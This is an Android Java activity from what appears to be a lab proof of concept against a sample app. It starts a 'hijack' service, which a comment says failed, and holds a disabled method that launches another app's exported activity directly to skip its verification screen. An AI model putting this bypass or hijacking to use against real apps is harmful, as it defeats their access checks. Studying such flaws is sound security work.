package com.example.crakebroadcast;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		// 启动一个服务，用来劫持进程--劫持失败
		Intent intent = new Intent(this, hijackservice.class);
		startService(intent);
		// 拒绝服务漏洞攻击(poc)
		//denfence();
	}

	//跳转到broadcast界面，跳过验证
	private void denfence() {
		// TODO Auto-generated method stub
		try {
			Intent intent = new Intent();
			intent.setComponent(new ComponentName("com.example.broadcasttest", "com.example.broadcasttest.MainActivity"));
			startActivity(intent);
		} catch (Exception e) {
			Toast.makeText(getApplicationContext(), "fail", 0).show();
		}
	}

}
